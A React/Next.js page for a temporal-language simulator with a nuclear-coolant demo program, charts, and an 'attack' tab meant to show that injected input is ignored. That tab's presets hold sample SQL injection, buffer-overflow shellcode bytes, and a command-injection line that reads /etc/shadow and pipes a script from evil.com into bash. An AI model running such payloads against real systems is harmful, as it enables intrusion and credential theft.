import React, { useState, useEffect, useRef, useCallback, useMemo } from 'react';
import Head from 'next/head';
import Link from 'next/link';
import { lex }           from '../lib/tempus/lexer';
import { parse }         from '../lib/tempus/parser';
import { buildRuntime, createSimulator } from '../lib/tempus/runtime';
import type { ParsedProgram } from '../lib/tempus/types';
import {
  CanvasScatter, CanvasBar, CanvasHBar, CanvasHistogram, CanvasLine, CanvasStrip,
} from '../components/charts';
import type {
  ScatterPoint, ScatterBand, BarEntry, HBarEntry, HistBand, LineSeries, StripEntry,
} from '../components/charts';

// ── Default program ───────────────────────────────────────────────────────────
const DEFAULT = `-- Nuclear coolant temperature monitor
sync coolant_sensor at 10.0e6 freq

cell NOMINAL  bounds (-1.0e-7, 1.0e-7)  action 0
cell WARM     bounds ( 1.0e-7, 5.0e-7)  action 1
cell HOT      bounds ( 5.0e-7, 2.0e-6)  action 2
cell CRITICAL bounds ( 2.0e-6, 1.0e-5)  action 3

compose d=1 channels coolant_sensor into coolant_traj

when NOMINAL  do emit status_ok
when WARM     do emit status_warn
when HOT      do begin
                 emit status_hot;
                 fire reduce_power(0.8)
               end
when CRITICAL do begin
                 emit scram_alert;
                 fire emergency_shutdown
               end`;

// ── Palette ───────────────────────────────────────────────────────────────────
const PALETTE = ['#58E6D9','#f59e0b','#f97316','#ef4444','#60a5fa','#a78bfa','#34d399','#fb923c'];
const ANOMALY = '#4b5563';

function cellPalette(names: string[]): Map<string, string> {
  const m = new Map<string, string>();
  names.forEach((n, i) => m.set(n, PALETTE[i % PALETTE.length]));
  m.set('anomaly', ANOMALY);
  return m;
}

function fmtDP(v: number): string {
  const a = Math.abs(v);
  if (a === 0) return '0';
  if (a < 1e-6) return `${(v * 1e9).toFixed(1)} ns`;
  if (a < 1e-3) return `${(v * 1e6).toFixed(2)} µs`;
  return `${(v * 1e3).toFixed(2)} ms`;
}

function nowStamp(): string {
  const d = new Date();
  return `${String(d.getMinutes()).padStart(2,'0')}:${String(d.getSeconds()).padStart(2,'0')}.${String(d.getMilliseconds()).padStart(3,'0')}`;
}

// ── State strip ───────────────────────────────────────────────────────────────
function StateStrip({ phase, cycle, lastDP, activeCell, lastAction, colors }: {
  phase: string; cycle: number; lastDP: number | null;
  activeCell: string | null; lastAction: string | null;
  colors: Map<string, string>;
}) {
  const phaseCol  = phase === 'EXECUTE' ? '#f59e0b' : phase === 'COMPILE' ? '#60a5fa' : '#4b5563';
  const phaseGlow = phase === 'EXECUTE' ? 'rgba(245,158,11,0.16)' : 'transparent';
  const cellCol   = activeCell ? (colors.get(activeCell) ?? 'rgba(255,255,255,0.6)') : 'rgba(255,255,255,0.22)';

  const items: { k: string; node: React.ReactNode }[] = [
    { k: 'Phase σ', node: (
        <span style={{ display:'inline-block', padding:'2px 8px',
                       border:`1px solid ${phaseCol}`, color: phaseCol, fontSize:10,
                       letterSpacing:'0.1em', background: phaseGlow,
                       boxShadow: phase === 'EXECUTE' ? `0 0 10px ${phaseGlow}` : 'none' }}>
          {phase}
        </span>
      ),
    },
    { k: 'Cycle M',    node: <span style={{ color:'rgba(255,255,255,0.7)' }}>{cycle > 0 ? cycle.toLocaleString() : '—'}</span> },
    { k: 'ΔP(k)',      node: <span style={{ color:'rgba(255,255,255,0.7)' }}>{lastDP !== null ? fmtDP(lastDP) : '—'}</span> },
    { k: 'Cell',       node: <span style={{ color: cellCol, fontWeight:600 }}>{activeCell ?? '—'}</span> },
    { k: 'Last action',node: <span style={{ color:'rgba(255,255,255,0.42)', fontSize:10, display:'block', overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap' }}>{lastAction ?? '—'}</span> },
  ];

  return (
    <div style={{ display:'grid', gridTemplateColumns:'repeat(5, 1fr)',
                  borderBottom:'1px solid rgba(255,255,255,0.07)',
                  background:'#080e0b', flexShrink:0 }}>
      {items.map(({ k, node }, i) => (
        <div key={k} style={{ padding:'8px 13px', borderRight: i < 4 ? '1px solid rgba(255,255,255,0.04)' : 'none' }}>
          <div style={{ fontSize:8, letterSpacing:'0.14em', color:'rgba(255,255,255,0.22)',
                        fontFamily:'monospace', textTransform:'uppercase', marginBottom:4 }}>{k}</div>
          <div style={{ fontSize:13, fontFamily:'monospace', fontWeight:500, lineHeight:1.2 }}>{node}</div>
        </div>
      ))}
    </div>
  );
}

// ── Cell registry ─────────────────────────────────────────────────────────────
function CellRegistry({ prog, colors, counts, activeCell }: {
  prog:       ParsedProgram;
  colors:     Map<string, string>;
  counts:     Map<string, number>;
  activeCell: string | null;
}) {
  return (
    <div style={{ height:'100%', display:'flex', flexDirection:'column', overflow:'hidden' }}>
      <div style={{ padding:'8px 10px 4px', fontSize:8, letterSpacing:'0.16em',
                    color:'rgba(255,255,255,0.22)', fontFamily:'monospace', flexShrink:0 }}>
        CELL  REGISTRY  Γ
      </div>
      <div style={{ flex:1, overflowY:'auto', padding:'0 7px 7px' }}>
        {Array.from(prog.cells.values()).map(cell => {
          const col    = colors.get(cell.name) ?? '#888';
          const acts   = prog.whens.get(cell.name) ?? [];
          const hits   = counts.get(cell.name) ?? 0;
          const active = cell.name === activeCell;
          return (
            <div key={cell.name} style={{
              padding:'6px 8px', marginBottom:3,
              border:`1px solid ${active ? col + 'aa' : 'rgba(255,255,255,0.05)'}`,
              background: active ? col + '10' : 'rgba(255,255,255,0.01)',
              boxShadow: active ? `0 0 12px ${col}25` : 'none', transition:'all 0.12s',
            }}>
              <div style={{ display:'flex', justifyContent:'space-between' }}>
                <span style={{ fontFamily:'monospace', fontSize:10, color: active ? col : col + 'bb',
                               fontWeight: active ? 700 : 400 }}>{cell.name}</span>
                <span style={{ fontFamily:'monospace', fontSize:10, color:'rgba(255,255,255,0.2)' }}>{hits}</span>
              </div>
              <div style={{ fontFamily:'monospace', fontSize:8, color:'rgba(255,255,255,0.25)', marginTop:2 }}>
                [{fmtDP(cell.lo)}, {fmtDP(cell.hi)}]
              </div>
              {acts.length > 0 && (
                <div style={{ fontFamily:'monospace', fontSize:8, marginTop:2,
                              color: active ? col + 'c0' : 'rgba(255,255,255,0.16)',
                              fontStyle:'italic', overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap' }}>
                  {acts[0]}
                </div>
              )}
            </div>
          );
        })}
      </div>
    </div>
  );
}

// ── Action log ────────────────────────────────────────────────────────────────
interface ActionEntry { ts: string; cell: string; action: string; dp: number; color: string; }

function ActionLog({ entries }: { entries: ActionEntry[] }) {
  return (
    <div style={{ height:'100%', display:'flex', flexDirection:'column', overflow:'hidden' }}>
      <div style={{ padding:'8px 10px 4px', fontSize:8, letterSpacing:'0.16em',
                    color:'rgba(255,255,255,0.22)', fontFamily:'monospace', flexShrink:0 }}>
        ACTION  LOG
      </div>
      {entries.length === 0 ? (
        <div style={{ flex:1, display:'flex', alignItems:'center', justifyContent:'center',
                      fontSize:9, color:'rgba(255,255,255,0.1)', fontStyle:'italic', fontFamily:'monospace' }}>
          no dispatches yet
        </div>
      ) : (
        <div style={{ flex:1, overflowY:'auto' }}>
          {entries.map((e, i) => (
            <div key={i} style={{ display:'grid', gridTemplateColumns:'50px 1fr 54px',
                                  gap:'0 6px', padding:'3px 9px',
                                  borderBottom:'1px solid rgba(255,255,255,0.03)',
                                  fontSize:9, fontFamily:'monospace' }}>
              <span style={{ color:'rgba(255,255,255,0.2)' }}>{e.ts}</span>
              <div style={{ minWidth:0 }}>
                <span style={{ color: e.color, fontWeight:600 }}>{e.cell}</span>
                <span style={{ color:'rgba(255,255,255,0.33)', marginLeft:5, overflow:'hidden',
                               textOverflow:'ellipsis', whiteSpace:'nowrap', display:'inline-block',
                               maxWidth:'calc(100% - 68px)', verticalAlign:'bottom' }}>
                  {e.action}
                </span>
              </div>
              <span style={{ color:'rgba(255,255,255,0.2)', textAlign:'right', fontSize:8 }}>{fmtDP(e.dp)}</span>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

// ── Attack panel ──────────────────────────────────────────────────────────────
const ATTACK_PRESETS: Record<string, string> = {
  SQL:  `'; DROP TABLE reactor_logs; --\nUNION SELECT password FROM admin_users WHERE '1'='1`,
  BOF:  `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\\x90\\x90\\x90\\x90\\xeb\\x1f\\x5e\\x89\\x76`,
  CMD:  `; cat /etc/shadow\n|| curl evil.com/x.sh | bash`,
  JSON: `{"op":"emergency_shutdown","authorized":true}\n{"cell":"CRITICAL","force_dispatch":true}`,
};

function AttackPanel({ cells }: { cells: Map<string, unknown> }) {
  const [payload, setPayload] = useState(`'; DROP TABLE reactor_logs; --\n\nAAAAAAAAAAAA\\x90\\x90\\x90\\xeb\\x1f\n\n{"op":"emergency_shutdown","authorized":true}`);
  const [log,   setLog]   = useState<{ ts: string; bytes: number }[]>([]);
  const [stats, setStats] = useState({ injections: 0, bytes: 0 });

  const inject = useCallback((text: string) => {
    setLog(p => [{ ts: nowStamp(), bytes: text.length }, ...p].slice(0, 60));
    setStats(s => ({ injections: s.injections + 1, bytes: s.bytes + text.length }));
  }, []);

  const flood = useCallback(() => {
    for (let i = 0; i < 100; i++) setTimeout(() => inject(payload + `\n#${i}`), i * 8);
  }, [payload, inject]);

  return (
    <div style={{ display:'flex', flexDirection:'column', height:'100%', overflow:'hidden' }}>
      <div style={{ padding:'10px 13px', background:'#0a1209',
                    borderBottom:'1px solid rgba(255,255,255,0.05)',
                    fontSize:10, fontFamily:'monospace', color:'rgba(255,255,255,0.32)', lineHeight:1.55 }}>
        A temporal system has <span style={{ color:'#58E6D9' }}>no content parser</span>.
        The only datum a pulse contributes is{' '}
        <em style={{ color:'rgba(255,255,255,0.6)' }}>when it arrived</em>.
        Inject anything — the action set stays bounded by the compiled cell registry.{' '}
        <span style={{ color:'rgba(255,255,255,0.18)' }}>Thm. 6.1</span>
      </div>
      <div style={{ padding:'10px 11px', borderBottom:'1px solid rgba(255,255,255,0.05)', flexShrink:0 }}>
        <textarea value={payload} onChange={e => setPayload(e.target.value)} spellCheck={false}
          style={{ width:'100%', background:'#0c0808', color:'#ef4444', fontFamily:'monospace',
                   fontSize:11, lineHeight:1.55, padding:'9px', border:'1px solid rgba(239,68,68,0.2)',
                   resize:'vertical', minHeight:72, outline:'none', boxSizing:'border-box' }} />
        <div style={{ display:'flex', gap:5, flexWrap:'wrap', marginTop:6 }}>
          {Object.entries(ATTACK_PRESETS).map(([k, v]) => (
            <button key={k} onClick={() => setPayload(v)}
              style={{ fontFamily:'monospace', fontSize:9, padding:'3px 7px',
                       border:'1px solid rgba(255,255,255,0.1)', background:'transparent',
                       color:'rgba(255,255,255,0.32)', cursor:'pointer' }}>{k}</button>
          ))}
        </div>
        <div style={{ display:'flex', gap:6, marginTop:7 }}>
          <button onClick={() => inject(payload)}
            style={{ fontFamily:'monospace', fontSize:10, letterSpacing:'0.1em', padding:'5px 13px',
                     background:'rgba(239,68,68,0.1)', color:'#ef4444',
                     border:'1px solid rgba(239,68,68,0.35)', cursor:'pointer' }}>INJECT</button>
          <button onClick={flood}
            style={{ fontFamily:'monospace', fontSize:10, letterSpacing:'0.1em', padding:'5px 13px',
                     background:'transparent', color:'rgba(255,255,255,0.28)',
                     border:'1px solid rgba(255,255,255,0.1)', cursor:'pointer' }}>FLOOD ×100</button>
          <button onClick={() => { setLog([]); setStats({ injections:0, bytes:0 }); }}
            style={{ fontFamily:'monospace', fontSize:10, padding:'5px 13px', marginLeft:'auto',
                     background:'transparent', color:'rgba(255,255,255,0.18)',
                     border:'1px solid rgba(255,255,255,0.07)', cursor:'pointer' }}>RESET</button>
        </div>
      </div>
      <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr 1fr 1fr',
                    borderBottom:'1px solid rgba(255,255,255,0.05)', flexShrink:0 }}>
        {[['INJECTED', String(stats.injections), undefined],
          ['BYTES', stats.bytes.toLocaleString(), undefined],
          ['PARSERS', '0', '#34d399'],
          ['|Cells(A)|', String(cells.size), '#58E6D9'],
        ].map(([k, v, c]) => (
          <div key={k as string} style={{ padding:'8px 6px', textAlign:'center',
                                          borderRight:'1px solid rgba(255,255,255,0.04)' }}>
            <div style={{ fontSize:7, letterSpacing:'0.12em', color:'rgba(255,255,255,0.2)', fontFamily:'monospace' }}>{k}</div>
            <div style={{ fontSize:15, color:(c ?? 'rgba(255,255,255,0.6)') as string,
                          fontFamily:'monospace', fontWeight:700, marginTop:2 }}>{v}</div>
          </div>
        ))}
      </div>
      <div style={{ flex:1, overflowY:'auto' }}>
        {log.length === 0 ? (
          <div style={{ textAlign:'center', padding:'20px', fontFamily:'monospace', fontSize:9,
                        color:'rgba(255,255,255,0.1)', fontStyle:'italic' }}>no injections yet</div>
        ) : log.map((e, i) => (
          <div key={i} style={{ display:'grid', gridTemplateColumns:'50px 40px 1fr',
                                gap:'0 7px', padding:'3px 11px',
                                borderBottom:'1px solid rgba(255,255,255,0.03)',
                                fontSize:9, fontFamily:'monospace' }}>
            <span style={{ color:'rgba(255,255,255,0.2)' }}>{e.ts}</span>
            <span style={{ color:'rgba(239,68,68,0.5)' }}>{e.bytes}B</span>
            <span style={{ color:'rgba(255,255,255,0.16)', fontStyle:'italic' }}>discarded · no parser</span>
          </div>
        ))}
      </div>
    </div>
  );
}

// ── Page ─────────────────────────────────────────────────────────────────────
interface Stats { total: number; dispatched: number; anomalies: number; done: boolean; }
interface LiveState { phase: string; cycle: number; lastDP: number | null; activeCell: string | null; lastAction: string | null; }

const STRIP_LEGEND = [
  { color: '#60a5fa', label: 'COMPILE' },
  { color: '#f59e0b', label: 'EXECUTE' },
];

function TempusSandbox() {
  const [code,       setCode]       = useState(DEFAULT);
  const [nEvents,    setNEvents]    = useState(600);
  const [noise,      setNoise]      = useState(0.35);
  const [speed,      setSpeed]      = useState(200);
  const [error,      setError]      = useState<string | null>(null);
  const [running,    setRunning]    = useState(false);
  const [leftTab,    setLeftTab]    = useState<'program' | 'attack'>('program');
  const [stats,      setStats]      = useState<Stats>({ total:0, dispatched:0, anomalies:0, done:false });
  const [liveState,  setLiveState]  = useState<LiveState>({ phase:'IDLE', cycle:0, lastDP:null, activeCell:null, lastAction:null });
  const [actionLog,  setActionLog]  = useState<ActionEntry[]>([]);
  const [parsedProg, setParsedProg] = useState<ParsedProgram | null>(null);
  const [colors,     setColors]     = useState<Map<string, string>>(new Map());
  const [cellCounts, setCellCounts] = useState<Map<string, number>>(new Map());

  // ── chart data state ──────────────────────────────────────────────────────
  const [scatterPoints, setScatterPoints] = useState<ScatterPoint[]>([]);
  const [scatterBands,  setScatterBands]  = useState<ScatterBand[]>([]);
  const [stripEntries,  setStripEntries]  = useState<StripEntry[]>([]);
  const [chanBarData,   setChanBarData]   = useState<HBarEntry[]>([]);
  const [dpValues,      setDpValues]      = useState<number[]>([]);
  const [histBands,     setHistBands]     = useState<HistBand[]>([]);
  const [rateSeries,    setRateSeries]    = useState<LineSeries[]>([]);

  const simRef      = useRef<ReturnType<typeof createSimulator> | null>(null);
  const colorsRef   = useRef<Map<string, string>>(new Map());
  const channelsRef = useRef<string[]>([]);
  const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);

  // ── cell bar data derived from current state ──────────────────────────────
  const cellBarData = useMemo<BarEntry[]>(() => {
    if (!parsedProg) return [];
    return [...Array.from(parsedProg.cells.keys()), 'anomaly'].map(name => ({
      label: name,
      value: cellCounts.get(name) ?? 0,
      color: colors.get(name) ?? ANOMALY,
    }));
  }, [parsedProg, cellCounts, colors]);

  const handleRun = useCallback(() => {
    try {
      setError(null);
      const prog      = buildRuntime(parse(lex(code)));
      const newColors = cellPalette(Array.from(prog.cells.keys()));
      const newChans  = prog.compose?.channels ?? Array.from(prog.syncs.keys());
      colorsRef.current   = newColors;
      channelsRef.current = newChans;
      setColors(newColors);
      setParsedProg(prog);
      setActionLog([]);
      setCellCounts(new Map());
      setLiveState({ phase:'COMPILE', cycle:0, lastDP:null, activeCell:null, lastAction:null });

      // set stable band data from compiled program
      setScatterBands(Array.from(prog.cells.values()).map(c => ({
        label: c.name, lo: c.lo, hi: c.hi, color: newColors.get(c.name) ?? '#888',
      })));
      setHistBands(Array.from(prog.cells.values()).map(c => ({
        lo: c.lo, hi: c.hi, color: newColors.get(c.name) ?? '#888',
      })));
      setChanBarData(newChans.map((ch, i) => ({ label: ch, value: 0, color: PALETTE[i % PALETTE.length] })));

      const batchSize = Math.max(1, Math.floor(speed / 20));
      simRef.current  = createSimulator(prog, { totalEvents: nEvents, noiseSigma: noise, seed: 42, batchSize });
      setRunning(true);
    } catch (e: any) { setError(String(e.message)); }
  }, [code, nEvents, noise, speed]);

  const handleStop = useCallback(() => {
    if (intervalRef.current) clearInterval(intervalRef.current);
    setRunning(false);
    setLiveState(s => ({ ...s, phase:'IDLE' }));
  }, []);

  const handleReset = useCallback(() => {
    handleStop();
    simRef.current?.reset();
    setActionLog([]);
    setCellCounts(new Map());
    setStats({ total:0, dispatched:0, anomalies:0, done:false });
    setLiveState({ phase:'IDLE', cycle:0, lastDP:null, activeCell:null, lastAction:null });
    setScatterPoints([]);
    setStripEntries([]);
    setChanBarData(channelsRef.current.map((ch, i) => ({ label:ch, value:0, color: PALETTE[i % PALETTE.length] })));
    setDpValues([]);
    setRateSeries([]);
  }, [handleStop]);

  // ── simulation loop ───────────────────────────────────────────────────────
  useEffect(() => {
    if (!running) return;
    intervalRef.current = setInterval(() => {
      if (!simRef.current || simRef.current.isDone()) {
        setRunning(false);
        setLiveState(s => ({ ...s, phase:'IDLE' }));
        return;
      }
      const batch = simRef.current.generateBatch();
      const last  = batch[batch.length - 1];
      if (last) setLiveState({ phase:last.phase, cycle:last.M, lastDP:last.dp, activeCell:last.cell, lastAction:last.actionFired });

      // action log entries
      const completions = batch.filter(e => e.actionFired !== null);
      if (completions.length > 0) {
        setActionLog(p => [
          ...completions.map(e => ({ ts:nowStamp(), cell:e.cell, action:e.actionFired!, dp:e.dp, color: colorsRef.current.get(e.cell) ?? ANOMALY })),
          ...p,
        ].slice(0, 80));
      }

      const evs    = simRef.current.getEvents();
      const recent = evs.slice(-500);

      // scatter points
      setScatterPoints(recent.map(ev => ({
        y:     ev.dp,
        color: (colorsRef.current.get(ev.cell) ?? ANOMALY) + (ev.actionFired ? '' : 'a0'),
        r:     ev.actionFired ? 3.5 : 1.8,
      })));

      // phase strip
      setStripEntries(recent.map(ev => ({
        color:   ev.phase === 'EXECUTE' ? '#f59e0b' : '#60a5fa',
        opacity: ev.phase === 'EXECUTE' ? 0.8 : 0.38,
      })));

      // dp values for histogram
      setDpValues(recent.map(ev => ev.dp));

      // per-cell counts
      const cnts = new Map<string, number>();
      evs.forEach(ev => cnts.set(ev.cell, (cnts.get(ev.cell) ?? 0) + 1));
      setCellCounts(new Map(cnts));

      // channel bar data
      const chanCnts = new Map<string, number>();
      channelsRef.current.forEach(ch => chanCnts.set(ch, 0));
      evs.forEach(ev => chanCnts.set(ev.channel, (chanCnts.get(ev.channel) ?? 0) + 1));
      setChanBarData(channelsRef.current.map((ch, i) => ({
        label: ch, value: chanCnts.get(ch) ?? 0, color: PALETTE[i % PALETTE.length],
      })));

      // rolling action rate
      const WIN = 50;
      const rateVals = recent.map((_, i) => {
        const lo = Math.max(0, i - WIN + 1);
        let cnt = 0;
        for (let j = lo; j <= i; j++) if (recent[j].actionFired) cnt++;
        return cnt / Math.min(i + 1, WIN);
      });
      setRateSeries([{ values: rateVals, color:'#58E6D9', fill:true }]);

      setStats({ total:evs.length, dispatched:evs.filter(e => e.actionFired!==null).length,
                 anomalies:evs.filter(e => e.cell==='anomaly').length, done:simRef.current.isDone() });
    }, 50);
    return () => { if (intervalRef.current) clearInterval(intervalRef.current); };
  }, [running]);

  const pct = nEvents > 0 ? Math.round((stats.total / nEvents) * 100) : 0;

  return (
    <div style={{ background:'#030705', color:'#e2e8f0', height:'100vh',
                  fontFamily:'monospace', display:'flex', flexDirection:'column', overflow:'hidden' }}>
      <Head><title>Tempus Sandbox</title></Head>

      {/* header */}
      <header style={{ height:50, borderBottom:'1px solid rgba(255,255,255,0.07)',
                       display:'flex', alignItems:'center', padding:'0 20px', gap:16, flexShrink:0 }}>
        <Link href="/" style={{ color:'rgba(255,255,255,0.28)', fontSize:10,
                                textDecoration:'none', letterSpacing:'0.16em' }}>← BACK</Link>
        <span style={{ color:'rgba(255,255,255,0.85)', fontSize:11, letterSpacing:'0.3em', fontWeight:700 }}>
          TEMPUS
        </span>
        <div style={{ marginLeft:'auto', display:'flex', gap:7 }}>
          {[
            { label:'RUN ▶', fn:handleRun,  dis:running,
              s:{ background:running ? '#1a2a1a' : '#58E6D9', color:running ? '#445' : '#020f0d', border:'none', fontWeight:700 } },
            { label:'STOP',  fn:handleStop, dis:!running,
              s:{ background:'transparent', color:!running?'rgba(255,255,255,0.15)':'#ef4444',
                  border:`1px solid ${!running?'rgba(255,255,255,0.07)':'#ef4444'}` } },
            { label:'RESET', fn:handleReset, dis:false,
              s:{ background:'transparent', color:'rgba(255,255,255,0.28)', border:'1px solid rgba(255,255,255,0.1)' } },
          ].map(b => (
            <button key={b.label} onClick={b.fn} disabled={b.dis}
              style={{ padding:'5px 15px', fontSize:10, letterSpacing:'0.12em',
                       cursor:b.dis?'not-allowed':'pointer', fontFamily:'monospace', ...b.s }}>
              {b.label}
            </button>
          ))}
        </div>
      </header>

      {/* body */}
      <div style={{ display:'flex', flex:1, overflow:'hidden', minHeight:0 }}>

        {/* ── LEFT ── */}
        <div style={{ width:385, flexShrink:0, borderRight:'1px solid rgba(255,255,255,0.07)',
                      display:'flex', flexDirection:'column', overflow:'hidden' }}>

          <div style={{ display:'flex', borderBottom:'1px solid rgba(255,255,255,0.07)', flexShrink:0 }}>
            {(['program','attack'] as const).map(tab => (
              <button key={tab} onClick={() => setLeftTab(tab)}
                style={{ flex:1, padding:'9px 6px', fontFamily:'monospace', fontSize:9,
                         letterSpacing:'0.14em', textTransform:'uppercase',
                         background:'transparent', border:'none', cursor:'pointer',
                         borderBottom:leftTab===tab?'2px solid #58E6D9':'2px solid transparent',
                         color:leftTab===tab?'#58E6D9':'rgba(255,255,255,0.28)', transition:'all 0.12s' }}>
                {tab === 'attack' ? 'Structural Incorruptibility' : 'Program'}
              </button>
            ))}
          </div>

          {leftTab === 'program' && (<>
            <textarea value={code} onChange={e => setCode(e.target.value)} spellCheck={false}
              style={{ flex:1, background:'#060b08', color:'#c8faf5', fontFamily:'monospace',
                       fontSize:11.5, lineHeight:1.65, padding:'13px', border:'none',
                       resize:'none', outline:'none', minHeight:0 }} />
            {error && (
              <div style={{ background:'#170606', color:'#ef4444', fontSize:10,
                            padding:'7px 11px', borderTop:'1px solid #3a1010', lineHeight:1.5 }}>
                {error}
              </div>
            )}
            <div style={{ padding:'10px 12px', borderTop:'1px solid rgba(255,255,255,0.06)',
                          display:'flex', flexDirection:'column', gap:8, flexShrink:0 }}>
              <div style={{ display:'grid', gridTemplateColumns:'64px auto 1fr', gap:8, alignItems:'center' }}>
                <label style={{ fontSize:8, letterSpacing:'0.14em', color:'rgba(255,255,255,0.28)', textTransform:'uppercase' }}>Events</label>
                <input type="number" value={nEvents} min={50} max={5000} step={50}
                  onChange={e => setNEvents(+e.target.value)}
                  style={{ width:72, background:'#0d1a14', border:'1px solid rgba(255,255,255,0.08)',
                           color:'#c8faf5', fontFamily:'monospace', fontSize:11, padding:'3px 6px' }} />
              </div>
              {[
                { lbl:'Noise σ', min:0,  max:1,    step:0.05, val:noise, set:setNoise, fmt:(v:number)=>v.toFixed(2), unit:'' },
                { lbl:'Speed',   min:20, max:1000, step:20,   val:speed, set:setSpeed, fmt:(v:number)=>String(v),    unit:'/s' },
              ].map(({ lbl, min, max, step, val, set, fmt, unit }) => (
                <div key={lbl} style={{ display:'grid', gridTemplateColumns:'64px 1fr 42px', gap:8, alignItems:'center' }}>
                  <label style={{ fontSize:8, letterSpacing:'0.14em', color:'rgba(255,255,255,0.28)', textTransform:'uppercase' }}>{lbl}</label>
                  <input type="range" min={min} max={max} step={step} value={val}
                    onChange={e => set(+e.target.value)} style={{ accentColor:'#58E6D9' }} />
                  <span style={{ fontSize:10, color:'#58E6D9', textAlign:'right' }}>{fmt(val)}{unit}</span>
                </div>
              ))}
              <div>
                <div style={{ background:'rgba(255,255,255,0.05)', height:2, borderRadius:1 }}>
                  <div style={{ background:'#58E6D9', height:'100%', borderRadius:1,
                                width:`${pct}%`, transition:'width 0.1s' }} />
                </div>
                <div style={{ display:'grid', gridTemplateColumns:'repeat(4,1fr)', marginTop:7 }}>
                  {[['EVENTS',`${stats.total}/${nEvents}`],['DISPATCH',String(stats.dispatched)],
                    ['ANOMALY',String(stats.anomalies)],['STATUS',stats.done?'DONE':running?'RUN':'IDLE']
                  ].map(([k,v]) => (
                    <div key={k} style={{ textAlign:'center' }}>
                      <div style={{ fontSize:7, letterSpacing:'0.12em', color:'rgba(255,255,255,0.2)', textTransform:'uppercase' }}>{k}</div>
                      <div style={{ fontSize:11, color:k==='STATUS'&&running?'#58E6D9':k==='ANOMALY'&&stats.anomalies>0?'#ef4444':'rgba(255,255,255,0.55)' }}>{v}</div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </>)}

          {leftTab === 'attack' && (
            <div style={{ flex:1, overflow:'hidden', display:'flex', flexDirection:'column' }}>
              <AttackPanel cells={parsedProg?.cells ?? new Map()} />
            </div>
          )}
        </div>

        {/* ── RIGHT ── */}
        <div style={{ flex:1, display:'flex', flexDirection:'column', overflow:'hidden', minWidth:0 }}>

          <StateStrip phase={liveState.phase} cycle={liveState.cycle} lastDP={liveState.lastDP}
            activeCell={liveState.activeCell} lastAction={liveState.lastAction} colors={colors} />

          {/*
            3 cols × 3 rows:
              Row 1: [ΔP Timeline ── span 2] [Cell Registry]
              Row 2: [Cell Freq]  [Phase Strip]  [Action Log]
              Row 3: [Channel HBar]  [ΔP Histogram]  [Action Rate]
          */}
          <div style={{ flex:1, display:'grid',
                        gridTemplateColumns:'1fr 1fr 230px',
                        gridTemplateRows:'1fr 1fr 1fr',
                        gap:1, background:'rgba(255,255,255,0.04)',
                        minHeight:0, overflow:'hidden' }}>

            {/* ΔP timeline */}
            <div style={{ gridColumn:'1/3', gridRow:1, background:'#030705', overflow:'hidden' }}>
              <CanvasScatter points={scatterPoints} bands={scatterBands} title="ΔP  TIMELINE" fmt={fmtDP} />
            </div>

            {/* cell registry */}
            <div style={{ gridColumn:3, gridRow:1, background:'#030705', overflow:'hidden' }}>
              {parsedProg ? (
                <CellRegistry prog={parsedProg} colors={colors} counts={cellCounts} activeCell={liveState.activeCell} />
              ) : (
                <div style={{ height:'100%', display:'flex', alignItems:'center', justifyContent:'center',
                              fontSize:9, color:'rgba(255,255,255,0.1)', fontStyle:'italic' }}>
                  compile to see registry
                </div>
              )}
            </div>

            {/* cell frequency */}
            <div style={{ gridColumn:1, gridRow:2, background:'#030705', overflow:'hidden' }}>
              <CanvasBar data={cellBarData} title="CELL  FREQUENCY" />
            </div>

            {/* phase strip */}
            <div style={{ gridColumn:2, gridRow:2, background:'#030705', overflow:'hidden' }}>
              <CanvasStrip entries={stripEntries} legend={STRIP_LEGEND} title="PHASE  TIMELINE" />
            </div>

            {/* action log */}
            <div style={{ gridColumn:3, gridRow:2, background:'#030705', overflow:'hidden' }}>
              <ActionLog entries={actionLog} />
            </div>

            {/* channel activity */}
            <div style={{ gridColumn:1, gridRow:3, background:'#030705', overflow:'hidden' }}>
              <CanvasHBar data={chanBarData} title="CHANNEL  ACTIVITY" />
            </div>

            {/* ΔP histogram */}
            <div style={{ gridColumn:2, gridRow:3, background:'#030705', overflow:'hidden' }}>
              <CanvasHistogram values={dpValues} bands={histBands}
                title="ΔP  HISTOGRAM" fmt={fmtDP} bins={40} />
            </div>

            {/* action rate */}
            <div style={{ gridColumn:3, gridRow:3, background:'#030705', overflow:'hidden' }}>
              <CanvasLine series={rateSeries} title="ACTION  RATE  (rolling)"
                fmt={v => v.toFixed(2)} yMin={0} />
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

TempusSandbox.getLayout = (page: React.ReactElement) => page;
export default TempusSandbox;
